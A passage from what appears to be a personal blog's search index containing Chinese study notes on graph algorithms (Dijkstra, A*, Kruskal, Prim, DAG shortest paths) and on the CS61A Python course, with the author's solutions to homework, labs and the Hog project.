greater&lt;pair&lt;LL, int&gt;&gt;&gt; minHeap;      // 初始化图     void init(int vertexCount) {         edgeCount = 0;         memset(head, -1, sizeof(head));  // -1表示没有边         fill(dist, dist + vertexCount + 1, LLONG_MAX / 2);  // 初始化为极大值     }      // 添加有向边     void addEdge(int from, int to, int weight) {         edges[edgeCount] = {to, weight, head[from]};         head[from] = edgeCount++;     }      // 添加无向边     void addUndirectedEdge(int u, int v, int weight) {         addEdge(u, v, weight);         addEdge(v, u, weight);     }      // 计算从源点source到所有点的最短路径     void compute(int vertexCount, int source) {         // vertexCount：最大节点数，防止数组越界         dist[source] = 0;         minHeap.push({0, source});          while (!minHeap.empty()) {             LL currentDist = minHeap.top().first;             int currentVertex = minHeap.top().second;             minHeap.pop();              // 跳过已处理的节点（避免重复计算）             if (currentDist &gt; dist[currentVertex]) continue;              // 遍历当前顶点的所有邻接边             for (int i = head[currentVertex]; i != -1; i = edges[i].next) {                 int neighbor = edges[i].to;                 int edgeWeight = edges[i].weight;                  // 松弛操作                 if (dist[neighbor] &gt; dist[currentVertex] + edgeWeight) {                     dist[neighbor] = dist[currentVertex] + edgeWeight;                     minHeap.push({dist[neighbor], neighbor});                 }             }         }     } }   该算法的核心应该是：  [Dist[neighbor]=min⁡(Dist[currentVertex]+edgeWeight,Dist[neighbor])]  A*算法  A*实际上是一个思想，利用启发式函数进行最短路搜索。A * 算法为每个节点 n 维护两个值：     g(n)：从起点到节点 n 的实际代价   h(n)：从节点 n 到终点的估计代价（启发函数）   f(n) = g(n) + h(n)：总估计代价   每次选择 f(n) 值最小的节点进行扩展，直到找到终点或遍历完所有可达节点。  一般来说，启发函数选择：     曼哈顿距离（网格只能上下左右移动）：h(n) = |x1-x2| + |y1-y2|   欧几里得距离（网格可斜向移动）：h(n) = √((x1-x2)² + (y1-y2)²)   对角线距离（网格允许 8 方向移动）：h(n) = max(|x1-x2|, |y1-y2|)   而在常规的抽象图问题中，只存在边权，不存在网格，通常选择启发式函数h(n)=0，此时算法退化为Dijkstra。  其他算法  最短路 - floyd 算法 - OI Wiki  最短路 - Bellman Ford 算法 - OI Wiki  最小生成树（Minimum Spanning Tree）  最小生成树详解(模板 + 例题)-CSDN博客给出了非常详细且直观的算法说明。  Kruskal 算法  Kruskal 算法基于贪心策略，通过按边权从小到大的顺序选择边，确保每次选择的边不形成回路，直到构建出包含所有顶点的最小生成树。该算法使用并查集（Union-Find）数据结构高效判断是否形成回路。  首先算法初始化并查集，然后从边权最小的边开始枚举，每次找到一个边，就把边连接到的两个节点union到并查集中，当枚举到第n-1个边时就得到了最小生成树，具体来说：     将所有边按权重从小到大排序   初始化并查集，每个顶点的父节点为自身   遍历排序后的边：            若边的两个端点属于不同集合（即不形成回路），则将该边加入 MST，并合并两个集合       若形成回路则跳过该边           重复步骤 3 直到加入 n-1 条边或遍历完所有边   import java.util.*;  class Edge implements Comparable&lt;Edge&gt; {     int src, dest, weight;      public Edge(int src, int dest, int weight) {         this.src = src;         this.dest = dest;         this.weight = weight;     }      @Override     public int compareTo(Edge other) {         return this.weight - other.weight;     } }   public class Kruskal {     private int V;     private List&lt;Edge&gt; edges;     private int[] disjointSet;     private Edge[] ans;      public Kruskal(int V) {         this.V = V;         edges = new ArrayList&lt;&gt;();         disjointSet = new int[V];         ans = new Edge[V-1];         for (int i = 0; i &lt; V; i++) {             disjointSet[i] = i;         }     }      public void addEdge(int src, int dest, int weight) {         edges.add(new Edge(src, dest, weight));     }      public void doKruskal() {          Collections.sort(edges);         int e = 0, i = 0;         while (e &lt; V - 1 &amp;&amp; i &lt; edges.size()){             Edge curr = edges.get(i++);             int Pfrom = find(curr.src);             int Pto = find(curr.dest);             if(Pfrom != Pto){                 ans[e++] = curr;                 union(Pfrom,Pto);             }         }     }      public void printKruskal() {         for (Edge e : ans) {             System.out.println(e.src + \" -&gt; \" + e.dest + \" == \" + e.weight);         }     }      private int find(int x) {         if (disjointSet[x] == x) return x;         return disjointSet[x] = find(disjointSet[x]);     }      private void union(int from, int to) {         int xRoot = find(from);         int yRoot = find(to);         disjointSet[xRoot] = yRoot;     }       public static void main(String[] args) {         int V = 4; // 4个顶点         Kruskal graph = new Kruskal(V);          // 添加边         graph.addEdge(0, 1, 10);         graph.addEdge(0, 2, 6);         graph.addEdge(0, 3, 5);         graph.addEdge(1, 3, 15);         graph.addEdge(2, 3, 4);          graph.doKruskal();         graph.printKruskal();     } }   Prim 算法  Prim算法以点为核心，使用深度优先搜索，类似Dijkstra算法。每搜到一个点就去找它边权最短的一条边，由于是一个图，总会存在一条路径使其遍历完整个图的节点，且满足只要局部最小全局一定最小。  import java.util.*;  class Edge implements Comparable&lt;Edge&gt; {     int to, weight;      public Edge(int to, int weight) {         this.to = to;         this.weight = weight;     }      @Override     public int compareTo(Edge other) {         return this.weight - other.weight;     } }  public class Prim {     private int V;     private List&lt;List&lt;Edge&gt;&gt; adj;     private boolean[] inMST;     private int[] key;     private int[] parent;      public Prim(int V) {         this.V = V;         adj = new ArrayList&lt;&gt;(V);         for (int i = 0; i &lt; V; i++) {             adj.add(new ArrayList&lt;&gt;());         }         inMST = new boolean[V];         key = new int[V];         parent = new int[V];         Arrays.fill(key, Integer.MAX_VALUE);         Arrays.fill(parent, -1);     }      public void addEdge(int src, int dest, int weight) {         adj.get(src).add(new Edge(dest, weight));         adj.get(dest).add(new Edge(src, weight)); // 无向图     }      public void doPrim() {         // 从顶点0开始         key[0] = 0;         PriorityQueue&lt;Edge&gt; pq = new PriorityQueue&lt;&gt;();         pq.offer(new Edge(0, 0));          while (!pq.isEmpty()) {             int u = pq.poll().to;             if (inMST[u]) continue;             inMST[u] = true;              for (Edge edge : adj.get(u)) {                 int v = edge.to;                 int weight = edge.weight;                 if (!inMST[v] &amp;&amp; weight &lt; key[v]) {                     key[v] = weight;                     parent[v] = u;                     pq.offer(new Edge(v, key[v]));                 }             }         }     }      public void printPrim() {         int totalWeight = 0;         System.out.println(\"Prim算法生成的MST:\");         for (int i = 1; i &lt; V; i++) { // 从1开始，因为顶点0是根             if (parent[i] == -1) {                 System.out.println(\"错误：输入的图不连通，无法生成完整的最小生成树！\");                 return;             }             System.out.println(parent[i] + \" -&gt; \" + i + \" == \" + key[i]);             totalWeight += key[i];         }         System.out.println(\"总权重: \" + totalWeight);     }      public static void main(String[] args) {         int V = 4;         Prim graph = new Prim(V);          // 添加边（与Kruskal示例相同）         graph.addEdge(0, 1, 10);         graph.addEdge(0, 2, 6);         graph.addEdge(0, 3, 5);         graph.addEdge(1, 3, 15);         graph.addEdge(2, 3, 4);          graph.doPrim();         graph.printPrim();     } }   有向无环图的单源最短路径树（Directed Acyclic Graph Shortest Path Spanning Tree，DAG SPT）  有向无环图是一种特殊的图。  拓扑序（Topological Order）是针对有向无环图（DAG） 的一种顶点排序方式，它满足一个核心条件：对于图中任意一条有向边 u−&gt;vu−&gt;v，顶点 u 在拓扑序中一定排在顶点 v 之前。简单来说，拓扑序是一种 “按依赖关系排序” 的方式，所有 “前置条件”（前驱顶点）都排在 “后续任务”（后继顶点）之前，且图中不存在环（否则无法满足这种排序）。一个 DAG 可能有多个拓扑序。  AcyclicSP（Directed Acyclic Graph Shortest Path）是专门针对有向无环图（DAG） 的单源最短路径算法。它利用 DAG 的拓扑序特性，高效地计算从源点到所有其他顶点的最短路径，并且允许边权为负。  算法步骤     拓扑排序：获取 DAG 的拓扑序列（例如使用 Kahn 算法或 DFS）。   初始化：            距离数组 dist[]：dist[s] = 0（源点），其余顶点初始化为无穷大（∞）。       前驱数组 edgeTo[]：记录最短路径的边。           按拓扑序松弛边：      对拓扑序列中的每个顶点v：   对v的每条出边 v-&gt;w：   若 dist[w] &gt; dist[v] + weight(v-&gt;w)，则更新 dist[w] 和edgeTo[w]。   特别地，如果要求最长路，则给所有边权取相反数，然后求最短路，即为最长路。  字典树（Trie）"
  },
  
  {
    "title": "UCB CS61A学习笔记",
    "url": "/posts/CS61A/",
    "categories": "Coding",
    "tags": "computer science, algorithm, python",
    "date": "2025-06-30 18:45:00 +0800",
    "content": "CS61A学习笔记  写在前面  CS61A的全称是Structure and Interpretation of Computer Programs（计算机程序的构造和解释），以Python语言授课。其课程内容主要是以Python为例，介绍程序设计中的各种方法，从控制语句到基础算法再到宏等。  单从课程目录来看，这门课与BIT开设的《C语言程序设计》有很多相似之处，虽然语言不同，但是思想却一致，所以学习CS61A并不需要按部就班的听每一节课，选择性地跳过已经学过的内容是高效的做法。  课程教材开源，可以直接阅读：Composing Programs  对于我个人来说，长期受C/C++、Java等强类型语言影响，很不适应Python的各种语法，学习本科目侧重于了解Python语言和编程思路，因而笔记也有不同的侧重点。  Part1 Python  Lecture 1 Welcome  主要是引入，强调了“表达式”概念  Lecture 2 Functions  变量与赋值  一个很神奇的Python变量赋值方式  f = max #max is a function   之后可以通过f来使用max  f(10,20,30) #30,相当于max(10,20,30)   个人认为这里相当于函数指针传递：  int max(int a,int b,int c); int (*f)(int,int,int) = &amp;max;   Python的特殊语法  显然相对于C语言，Python在变量上更加灵活。  需要注意的是在如下Python语句中：  a = 1 b = 2 a, b = a+b, a   a 最终为3，b最终为1，这里逗号表达式是同时进行赋值操作，所以不能理解为：  a = a + b b = a   函数的返回值  C 语言借助void类型来显式表明函数无返回值，并且禁止把这类函数的调用结果用于赋值操作。而 Python 采用动态类型系统，不管函数是否有返回值都能进行赋值，没有返回值时就返回None。这体现了静态类型语言（C 语言）和动态类型语言（Python）在设计理念上的差异。  例如在一个C语言例子中：  #include &lt;stdio.h&gt;  void test(int a){ \tint b = a; \treturn; }  int main(){    \tint b = test(2); \tprintf(\"%d\",b); \treturn 0; }   尝试编译运行会得到如下报错：  main.c: In function ‘main’: main.c:12:13: error: void value not ignored as it ought to be    12 |     int b = test(2);       |             ^~~~   意味着编译器禁止了接收void类型函数返回值的行为。  而在python中，对于：  &gt;&gt;&gt; print(print(1),print(2))   会有如下结果：  1 2 None None   也就是说，Python的任意函数都有返回值，在没有显式写明返回值时，返回None。  需要注意的是None并不等同与NULL，None表示 “存在但无值”，可以参与逻辑判断如：  if a is None: #使用is进行身份判断   而NULL通常表示 “无效引用” 或 “未初始化”（如空指针、空引用），涉及内存/地址。  Lecture 3 Control  讲了一些Python的基本语法与解释器运行法则及其部分用法。  在Python中布尔值为False的有：False，0，''，None，其余为True。  Python中没有传统意义的for循环。  Lab 00: Getting Started  教你如何本地测评与上传代码，由于咱不是UCB的学生，所以也没有办法上传代码，这段跳过。  HW 01: Functions, Control, Higher-Order Functions  from operator import add, mul  def square(x):     return x * x  def identity(x):     return x  def triple(x):     return 3 * x  def increment(x):     return x + 1   from operator import add, sub  def a_plus_abs_b(a, b):     \"\"\"Return a+abs(b), but without calling abs.      &gt;&gt;&gt; a_plus_abs_b(2, 3)     5     &gt;&gt;&gt; a_plus_abs_b(2, -3)     5     &gt;&gt;&gt; a_plus_abs_b(-1, 4)     3     &gt;&gt;&gt; a_plus_abs_b(-1, -4)     3     \"\"\"     if b &lt; 0:         f = sub     else:         f = add     return f(a, b)  def a_plus_abs_b_syntax_check():     \"\"\"Check that you didn't change the return statement of a_plus_abs_b.      &gt;&gt;&gt; # You aren't expected to understand the code of this test.     &gt;&gt;&gt; import inspect, re     &gt;&gt;&gt; re.findall(r'^\\s*(return .*)', inspect.getsource(a_plus_abs_b), re.M)     ['return f(a, b)']     \"\"\"     # You don't need to edit this function. It's just here to check your work.   def hailstone(n):     \"\"\"Print the hailstone sequence starting at n and return its     length.      &gt;&gt;&gt; a = hailstone(10)     10     5     16     8     4     2     1     &gt;&gt;&gt; a     7     &gt;&gt;&gt; b = hailstone(1)     1     &gt;&gt;&gt; b     1     \"\"\"     \"*** YOUR CODE HERE ***\"     print(n)     if n % 2 == 0:         return hailstone(n // 2) + 1     elif n % 2 != 0:         if n == 1:             return 1         else:             return hailstone(3 * n + 1) + 1   def product(n, term):     \"\"\"Return the product of the first n terms in a sequence.      n: a positive integer     term: a function that takes an index as input and produces a term      &gt;&gt;&gt; product(3, identity)  # 1 * 2 * 3     6     &gt;&gt;&gt; product(5, identity)  # 1 * 2 * 3 * 4 * 5     120     &gt;&gt;&gt; product(3, square)    # 1^2 * 2^2 * 3^2     36     &gt;&gt;&gt; product(5, square)    # 1^2 * 2^2 * 3^2 * 4^2 * 5^2     14400     &gt;&gt;&gt; product(3, increment) # (1+1) * (2+1) * (3+1)     24     &gt;&gt;&gt; product(3, triple)    # 1*3 * 2*3 * 3*3     162     \"\"\"     \"*** YOUR CODE HERE ***\"     if n == 1:         return term(1)     else:         return term(n) * product(n - 1, term)    def make_repeater(f, n):     \"\"\"Returns the function that computes the nth application of f.      &gt;&gt;&gt; add_three = make_repeater(increment, 3)     &gt;&gt;&gt; add_three(5)     8     &gt;&gt;&gt; make_repeater(triple, 5)(1) # 3 * (3 * (3 * (3 * (3 * 1))))     243     &gt;&gt;&gt; make_repeater(square, 2)(5) # square(square(5))     625     &gt;&gt;&gt; make_repeater(square, 3)(5) # square(square(square(5)))     390625     \"\"\"     \"*** YOUR CODE HERE ***\"     def repeater(x):         if n == 0:             return x         else:             return make_repeater(f, n - 1)(f(x))     return repeater    Lecture 4 Higher-Order Functions  先讲了一些优先运算行为，比如在python中，函数的参数在传入前要依次进行运算等。该例子老师讲的很到位，不再赘述。  紧接着是高阶函数。实际上可以理解为Python的形式参数可以接收函数名并在函数内部调用函数；此外，Python允许嵌套函数。  例如：  def apply_twice(f, x):     return f(f(X))  def square(x):     return x * x  result = apply_twice(square, 2)   此时相当于：  result = square(square(2))   在C语言中可以尝试理解为：  int apply_twice(int (*f)(int), int x){     return f(f(x)); }  int square(int x){     return x * x; }  int main(){     result = apply_twice(square, 2);     return 0; }   其中，函数指针在C语言的声明方式为&lt;返回值类型&gt; (*指针名)(参数列表)  Lecture 5 Environments  Python的闭包  给到一个例子：  def make_adder(n):     def adder(k):         return n + k     return adder  add_three = make_adder(3) add_three(4)   这段 Python 代码展示了闭包（Closure）的概念，即在函数内部定义的子函数可以捕获并记住外部函数的局部变量（本例子中为n），在C++11中引入的lambda表达式与Python的闭包极为相似，若用C++转写这段代码，可以写为：  auto make_adder(int n){     return [n](int k){         return n + k;     }; }  int main(){     auto add_three = make_adder(3);     std::cout &lt;&lt; add_three(4) &lt;&lt; endl;     return 0; }   C++ 中的 lambda 表达式是 C++11 引入的一项重要特性，它允许你在代码中内联定义匿名函数对象，从而方便地实现闭包功能，其格式为[capture list](parameter list) -&gt; return type { function body }  capture list为捕获列表，意味lambda表达式可从外界获取的参数，可以为引用，也可以为值；  parameter list为形式参数列表；  -&gt; return type 为返回值类型，可以省略，由auto自动推断；  auto func = [](int x) { return x * 2; }; // 等价于以下类的实例： struct __lambda {     int operator()(int x) const { return x * 2; } }; auto func = __lambda{};   回到Python的例子，return adder相当于返回一个函数指针，如此便可以理解。  对于Python，它也有lambda表达式，形式较为简单：lambda &lt;参数列表&gt;: &lt;表达式&gt;，自动返回表达式的值，为匿名函数。需要注意的是，Python的lambda表达式没有C++的强大，仅能完成一些简单的表达式计算。  add = lambda a, b: a + b  # 等价于 def add(a, b): return a + b print(add(3, 4))  # 输出：7   Lab 01: Functions, Control  前两个讨论题主要是关于Python的Shell，print可以打印字符，直接运行函数也可以显示其返回值，这里不再赘述。  def falling(n, k):     \"\"\"Compute the falling factorial of n to depth k.      &gt;&gt;&gt; falling(6, 3)  # 6 * 5 * 4     120     &gt;&gt;&gt; falling(4, 3)  # 4 * 3 * 2     24     &gt;&gt;&gt; falling(4, 1)  # 4     4     &gt;&gt;&gt; falling(4, 0)     1     \"\"\"     \"*** YOUR CODE HERE ***\"     ans = 1     i, j = k, n     while(i &gt; 0):         ans *= j         j -= 1         i -= 1     return ans   def divisible_by_k(n, k):     \"\"\"     &gt;&gt;&gt; a = divisible_by_k(10, 2)  # 2, 4, 6, 8, and 10 are divisible by 2     2     4     6     8     10     &gt;&gt;&gt; a     5     &gt;&gt;&gt; b = divisible_by_k(3, 1)  # 1, 2, and 3 are divisible by 1     1     2     3     &gt;&gt;&gt; b     3     &gt;&gt;&gt; c = divisible_by_k(6, 7)  # There are no integers up to 6 that are divisible by 7     &gt;&gt;&gt; c     0     \"\"\"     \"*** YOUR CODE HERE ***\"     count = 0     i = 1     while(i &lt;= n):         if i % k == 0:             print(i)             count += 1         i += 1     return count   def double_eights(n):     \"\"\"Return true if n has two eights in a row.     &gt;&gt;&gt; double_eights(8)     False     &gt;&gt;&gt; double_eights(88)     True     &gt;&gt;&gt; double_eights(2882)     True     &gt;&gt;&gt; double_eights(880088)     True     &gt;&gt;&gt; double_eights(12345)     False     &gt;&gt;&gt; double_eights(80808080)     False     \"\"\"     \"*** YOUR CODE HERE ***\"     while(n &gt;= 10):         if n % 10 == 8 and (n // 10) % 10 == 8:             return True         n //= 10     return False   def two_of_three(i, j, k):     \"\"\"Return m*m + n*n, where m and n are the two smallest members of the     positive numbers i, j, and k.      &gt;&gt;&gt; two_of_three(1, 2, 3)     5     &gt;&gt;&gt; two_of_three(5, 3, 1)     10     &gt;&gt;&gt; two_of_three(10, 2, 8)     68     &gt;&gt;&gt; two_of_three(5, 5, 5)     50     \"\"\"     return min(i, j, k) ** 2 + max(min(i, j),min(j, k),min(i, k)) ** 2  def two_of_three_syntax_check():     \"\"\"Check that your two_of_three code consists of nothing but a return statement.      &gt;&gt;&gt; # You aren't expected to understand the code of this test.     &gt;&gt;&gt; import inspect, ast     &gt;&gt;&gt; [type(x).__name__ for x in ast.parse(inspect.getsource(two_of_three)).body[0].body]     ['Expr', 'Return']     \"\"\"     # You don't need to edit this function. It's just here to check your work.   def middle(a, b, c):     \"\"\"Return the number among a, b, and c that is not the smallest or largest.     Assume a, b, and c are all different numbers.      &gt;&gt;&gt; middle(3, 5, 4)     4     &gt;&gt;&gt; middle(30, 5, 4)     5     &gt;&gt;&gt; middle(3, 5, 40)     5     &gt;&gt;&gt; middle(3, 5, 40)     5     &gt;&gt;&gt; middle(30, 5, 40)     30     \"\"\"     return max(min(a, b),min(b, c),min(a, c))   def largest_factor(n):     \"\"\"Return the largest factor of n that is smaller than n.      &gt;&gt;&gt; largest_factor(15) # factors are 1, 3, 5     5     &gt;&gt;&gt; largest_factor(80) # factors are 1, 2, 4, 5, 8, 10, 16, 20, 40     40     &gt;&gt;&gt; largest_factor(13) # factors are 1, 13     1     \"\"\"     \"*** YOUR CODE HERE ***\"     for i in range(n - 1, 0, -1):         if n % i == 0:             return i     return 1  def multiple(a, b):     \"\"\"Return the smallest number n that is a multiple of both a and b.      &gt;&gt;&gt; multiple(3, 4)     12     &gt;&gt;&gt; multiple(14, 21)     42     \"\"\"     \"*** YOUR CODE HERE ***\"     def gcd(x, y):         while y:             x, y = y, x % y         return x     def lcm(x, y):         return (x * y) // gcd(x, y)     return lcm(a, b)   Lecture 6 Sound (Optional)  选修课，用python制作wav音频  Project 01: The Game of Hog     规则    在 Hog 游戏中，两名玩家轮流尝试成为第一个以至少 GOAL 总分结束回合的人，其中 GOAL 默认为 100。在每个回合中，当前玩家选择掷出一些骰子，最多 10 个。该玩家该回合的分数是骰子结果的总和。但是，掷出太多骰子的玩家会面临以下风险：         逢一判负：如果掷出的骰子中任何一个为 1，则当前玩家该回合得分为 1。(英文名：Sow Sad)     示例 1： 当前玩家掷出 7 个骰子，其中 5 个骰子的结果为 1。他们该回合得 1 分。     示例 2： 当前玩家掷出 4 个骰子，所有骰子的结果均为 3。由于未发生逢一判负，他们该回合得 12 分。       在正常的 Hog 游戏中，这些就是所有的规则。为了给游戏增添趣味，我们将加入一些特殊规则：         野猪乱斗：当玩家掷出零个骰子时，其得分为对手分数十位与自身分数个位之差的绝对值的三倍，或者 1 分，取两者中的较大值。(英文名：Boar Brawl) 个位数为最右边的数字，十位数为倒数第二位数字。如果玩家的分数是个位数（小于 10），则该玩家分数的十位数为 0。     示例 1：                当前玩家有 21 分，对手有 46 分，当前玩家选择不掷骰子。         对手分数的十位数为 4，当前玩家分数的个位数为 1。         因此，玩家获得 3 * abs(4 - 1) = 9 分。                 示例 2：                当前玩家有 45 分，对手有 52 分，当前玩家选择跳过掷骰子环节。         对手分数的十位数为 5，当前玩家分数的个位数为 5。         由于 3 * abs(5 - 5) = 0，因此玩家获得 1 分。                 示例 3：                当前玩家有 2 分，对手有 5 分，当前玩家选择掷出零个骰子。         对手分数的十位数为 0，当前玩家分数的个位数为 2。         因此，玩家获得 3 * abs(0 - 2) = 6 分。                 Sus Fuss。如果一个数字恰好有 3 个或 4 个因子（包括 1 和它本身），我们就称它为 sus，即满足“可疑”条件的数字。如果在掷骰子后，当前玩家的分数是一个 sus 数字，那么他们的分数会直接提升至下一个质数。     示例 1：                玩家有 14 分，掷出 2 个骰子，总共得到 7 分。他们的新分数将是 21，新分数 21 包含四个因子：1、3、7 和 21。因为 21 是 sus，所以玩家的分数增加到 23，即下一个质数。                 示例 2：                玩家有 63 分，掷出 5 个骰子，总共得到 1 分。他们的新分数将是 64，它有 7 个因子：1、2、4、8、16、32 和 64。因为 64 不是 sus，所以玩家的分数保持不变。                 示例 3：                玩家有 49 分，掷出 5 个骰子，总共得到 18 分。他们的新分数将是 67，这是一个质数，有 2 个因子：1 和 67。因为 67 不是 sus，所以玩家的分数保持不变。                  \"\"\"The Game of Hog.\"\"\" #./hog.py #author:lamaper  from dice import six_sided, make_test_dice from ucb import main, trace, interact  GOAL = 100  # The goal of Hog is to score 100 points.  ###################### # Phase 1: Simulator # ######################   def roll_dice(num_rolls, dice=six_sided):     \"\"\"Simulate rolling the DICE exactly NUM_ROLLS &gt; 0 times. Return the sum of     the outcomes unless any of the outcomes is 1. In that case, return 1.      num_rolls:  The number of dice rolls that will be made.     dice:       A function that simulates a single dice roll outcome. Defaults to the six sided dice.     \"\"\"     # These assert statements ensure that num_rolls is a positive integer.     assert type(num_rolls) == int, \"num_rolls must be an integer.\"     assert num_rolls &gt; 0, \"Must roll at least once.\"     # BEGIN PROBLEM 1     \"*** YOUR CODE HERE ***\"     i = 0     total = 0     while(i &lt; num_rolls):         roll = dice()         if roll == 1:             return 1         total += roll         i += 1     return total     # END PROBLEM 1   def boar_brawl(player_score, opponent_score):     \"\"\"Return the points scored when the current player rolls 0 dice according to Boar Brawl.      player_score:     The total score of the current player.     opponent_score:   The total score of the other player.      \"\"\"     # BEGIN PROBLEM 2     \"*** YOUR CODE HERE ***\"     a = player_score % 10     b = (opponent_score // 10) % 10     return max(3 * abs(a - b), 1)     # END PROBLEM 2   def take_turn(num_rolls, player_score, opponent_score, dice=six_sided):     \"\"\"Return the points scored on a turn rolling NUM_ROLLS dice when the     current player has PLAYER_SCORE points and the opponent has OPPONENT_SCORE points.      num_rolls:       The number of dice rolls that will be made.     player_score:    The total score of the current player.     opponent_score:  The total score of the other player.     dice:            A function that simulates a single dice roll outcome.     \"\"\"     # Leave these assert statements here; they help check for errors.     assert type(num_rolls) == int, \"num_rolls must be an integer.\"     assert num_rolls &gt;= 0, \"Cannot roll a negative number of dice in take_turn.\"     assert num_rolls &lt;= 10, \"Cannot roll more than 10 dice.\"     # BEGIN PROBLEM 3     \"*** YOUR CODE HERE ***\"     if num_rolls == 0:         return boar_brawl(player_score, opponent_score)     else:         return roll_dice(num_rolls, dice)     # END PROBLEM 3   def simple_update(num_rolls, player_score, opponent_score, dice=six_sided):     \"\"\"Return the total score of a player who starts their turn with     PLAYER_SCORE and then rolls NUM_ROLLS DICE, ignoring Sus Fuss.     \"\"\"     score = player_score + take_turn(num_rolls, player_score, opponent_score, dice)     return score   def is_prime(n):     \"\"\"Return whether N is prime.\"\"\"     if n == 1:         return False     k = 2     while k &lt; n:         if n % k == 0:             return False         k += 1     return True   def num_factors(n):     \"\"\"Return the number of factors of N, including 1 and N itself.\"\"\"     # BEGIN PROBLEM 4     \"*** YOUR CODE HERE ***\"     if n == 1:         return 1     if is_prime(n):         return 2     count = 0     for i in range(1, n + 1):         if n % i == 0:             count += 1     return count     # END PROBLEM 4   def sus_points(score):     \"\"\"Return the new score of a player taking into account the Sus Fuss rule.\"\"\"     # BEGIN PROBLEM 4     \"*** YOUR CODE HERE ***\"     sus = num_factors(score)     if sus == 3 or sus == 4:         i = score         while not is_prime(i):             i += 1         return i     else :         return score     # END PROBLEM 4   def sus_update(num_rolls, player_score, opponent_score, dice=six_sided):     \"\"\"Return the total score of a player who starts their turn with     PLAYER_SCORE and then rolls NUM_ROLLS DICE, *including* Sus Fuss.     \"\"\"     # BEGIN PROBLEM 4     \"*** YOUR CODE HERE ***\"     score = take_turn(num_rolls, player_score, opponent_score, dice)     return sus_points(player_score + score)     # END PROBLEM 4   def always_roll_5(score, opponent_score):     \"\"\"A strategy of always rolling 5 dice, regardless of the player's score or     the opponent's score.     \"\"\"     return 5   def play(strategy0, strategy1, update, score0=0, score1=0, dice=six_sided, goal=GOAL):     \"\"\"Simulate a game and return the final scores of both players, with     Player 0's score first and Player 1's score second.      E.g., play(always_roll_5, always_roll_5, sus_update) simulates a game in     which both players always choose to roll 5 dice on every turn and the Sus     Fuss rule is in effect.      A strategy function, such as always_roll_5, takes the current player's     score and their opponent's score and returns the number of dice the current     player chooses to roll.      An update function, such as sus_update or simple_update, takes the number     of dice to roll, the current player's score, the opponent's score, and the     dice function used to simulate rolling dice. It returns the updated score     of the current player after they take their turn.      strategy0: The strategy for player0.     strategy1: The strategy for player1.     update:    The update function (used for both players).     score0:    Starting score for Player 0     score1:    Starting score for Player 1     dice:      A function of zero arguments that simulates a dice roll.     goal:      The game ends and someone wins when this score is reached.     \"\"\"     who = 0  # Who is about to take a turn, 0 (first) or 1 (second)     # BEGIN PROBLEM 5     \"*** YOUR CODE HERE ***\"     while score0 &lt; goal and score1 &lt; goal:         if who == 0:             num_rolls = strategy0(score0, score1)             score0 = update(num_rolls, score0, score1, dice)             if score0 &gt;= goal:                 break             who = 1         else:             num_rolls = strategy1(score1, score0)             score1 = update(num_rolls, score1, score0, dice)             if score1 &gt;= goal:                 break             who = 0     # END PROBLEM 5     return score0, score1   ####################### # Phase 2: Strategies # #######################   def always_roll(n):     \"\"\"Return a player strategy that always rolls N dice.      A player strategy is a function that takes two total scores as arguments     (the current player's score, and the opponent's score), and returns a     number of dice that the current player will roll this turn.      &gt;&gt;&gt; strategy = always_roll(3)     &gt;&gt;&gt; strategy(0, 0)     3     &gt;&gt;&gt; strategy(99, 99)     3     \"\"\"     assert n &gt;= 0 and n &lt;= 10      # BEGIN PROBLEM 6     \"*** YOUR CODE HERE ***\"     def strategy(score, opponent_score):         \"\"\"Return the number of dice to roll.\"\"\"         return n     return strategy     # END PROBLEM 6   def catch_up(score, opponent_score):     \"\"\"A player strategy that always rolls 5 dice unless the opponent     has a higher score, in which case 6 dice are rolled.      &gt;&gt;&gt; catch_up(9, 4)     5     &gt;&gt;&gt; strategy(17, 18)     6     \"\"\"     if score &lt; opponent_score:         return 6  # Roll one more to catch up     else:         return 5   def is_always_roll(strategy, goal=GOAL):     \"\"\"Return whether STRATEGY always chooses the same number of dice to roll     for every possible combination of score and opponent_score     given a game that goes to GOAL points.      &gt;&gt;&gt; is_always_roll(always_roll_5)     True     &gt;&gt;&gt; is_always_roll(always_roll(3))     True     &gt;&gt;&gt; is_always_roll(catch_up)     False     \"\"\"     # BEGIN PROBLEM 7     \"*** YOUR CODE HERE ***\"     for score in range(goal):         for opponent_score in range(goal):             if strategy(score, opponent_score) != strategy(0, 0):                 return False     return True     # END PROBLEM 7   def make_averaged(original_function, times_called=1000):     \"\"\"Return a function that returns the average value of ORIGINAL_FUNCTION     called TIMES_CALLED times.      To implement this function, you will have to use *args syntax.      &gt;&gt;&gt; dice = make_test_dice(4, 2, 5, 1)     &gt;&gt;&gt; averaged_dice = make_averaged(roll_dice, 40)     &gt;&gt;&gt; averaged_dice(1, dice)  # The avg of 10 4's, 10 2's, 10 5's, and 10 1's     3.0     \"\"\"      # BEGIN PROBLEM 8     \"*** YOUR CODE HERE ***\"     def averaged_function(*args):         total = 0         for _ in range(times_called):             total += original_function(*args)         return total / times_called     return averaged_function      # END PROBLEM 8   def max_scoring_num_rolls(dice=six_sided, times_called=1000):     \"\"\"Return the number of dice (1 to 10) that gives the maximum average score for a turn.     Assume that the dice always return positive outcomes.      &gt;&gt;&gt; dice = make_test_dice(1, 6)     &gt;&gt;&gt; max_scoring_num_rolls(dice)     1     \"\"\"     # BEGIN PROBLEM 9     \"*** YOUR CODE HERE ***\"     max_score = 0     min_rolls = 11     for num_rolls in range(1, 11):         score = make_averaged(roll_dice, times_called)(num_rolls, dice)         if score &gt; max_score:             max_score = score             min_rolls = num_rolls         elif score == max_score:             min_rolls = min(min_rolls, num_rolls)     return min_rolls     # END PROBLEM 9   def winner(strategy0, strategy1):     \"\"\"Return 0 if strategy0 wins against strategy1, and 1 otherwise.\"\"\"     score0, score1 = play(strategy0, strategy1, sus_update)     if score0 &gt; score1:         return 0     else:         return 1   def average_win_rate(strategy, baseline=always_roll(6)):     \"\"\"Return the average win rate of STRATEGY against BASELINE. Averages the     winrate when starting the game as player 0 and as player 1.     \"\"\"     win_rate_as_player_0 = 1 - make_averaged(winner)(strategy, baseline)     win_rate_as_player_1 = make_averaged(winner)(baseline, strategy)      return (win_rate_as_player_0 + win_rate_as_player_1) / 2   def run_experiments():     \"\"\"Run a series of strategy experiments and report results.\"\"\"     six_sided_max = max_scoring_num_rolls(six_sided)     print(\"Max scoring num rolls for six-sided dice:\", six_sided_max)      print(\"always_roll(6) win rate:\", average_win_rate(always_roll(6)))  # near 0.5     print(\"catch_up win rate:\", average_win_rate(catch_up))     print(\"always_roll(3) win rate:\", average_win_rate(always_roll(3)))     print(\"always_roll(8) win rate:\", average_win_rate(always_roll(8)))      print(\"boar_strategy win 